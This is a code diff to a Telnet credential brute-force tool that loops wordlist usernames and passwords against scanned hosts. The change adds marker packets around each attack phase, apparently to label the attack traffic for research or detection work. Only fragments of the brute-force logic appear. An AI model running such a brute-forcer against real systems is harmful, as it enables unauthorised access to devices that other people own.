@@ -3,6 +3,7 @@ from src.scanner import Host
 import os
 from telnetlib import Telnet
 from enum import Enum
+from packet import send_packet
 
 
 class States(Enum):
@@ -29,14 +30,17 @@ class Telnet_Bruteforce:
             print("Error: Wordlist not found")
             exit(1)
         self.wordlist = wordlist_dir
-        self.cons = [self.init_host(host.ip, port)
+        self.cons = [self.init_host(host, port)
                      for host in hosts
                      for port in host.filtered_ports["telnet"]]
         self.cons = [x for x in self.cons if x is not None]
 
-    def init_host(self, ip, port):
+
+    def init_host(self, host, port):
         try:
-            con = Connection(ip, port, Telnet(ip, port))
+            send_packet("telnet_bruteforce_init_connection", host.ip, "start", host.mac)
+            con = Connection(host.ip, port, Telnet(host.ip, port))
+            send_packet("telnet_bruteforce_init_connection", host.ip, "end", host.mac)
         except ConnectionRefusedError:
             con = None
         return con
@@ -101,10 +105,12 @@ class Telnet_Bruteforce:
                 elif con.state == States.LOGIN:
                     flag = True
                     user, _ = self.retrieve_user_pass(con.counter)
+                    send_packet("telnet_bruteforce_send_username", con.host.ip, "start", con.host.mac)
                     if self.send_line(con.fd, user):
                         con.state = States.LOGIN_SENT
                     else:
                         con.state = States.FAILED
+                    send_packet("telnet_bruteforce_send_username", con.host.ip, "stop", con.host.mac)
                 elif con.state == States.LOGIN_SENT:
                     flag = True
                     res = self.evaluate_username(con.fd)
@@ -114,12 +120,14 @@ class Telnet_Bruteforce:
                         con.state = States.LOGIN
                         con.counter += 1
                     else:
+                        send_packet("telnet_bruteforce_send_password", con.host.ip, "start", con.host.mac)
                         _, passw = self.retrieve_user_pass(con.counter)
                         if self.send_line(con.fd, passw):
                             con.state = States.LOGIN_SENT
                         else:
                             con.state = States.FAILED
                         con.state = States.PASSWORD_SENT
+                        send_packet("telnet_bruteforce_send_password", con.host.ip, "stop", con.host.mac)
                 elif con.state == States.PASSWORD_SENT:
                     flag = True
                     res = self.evaluate_password(con.fd)
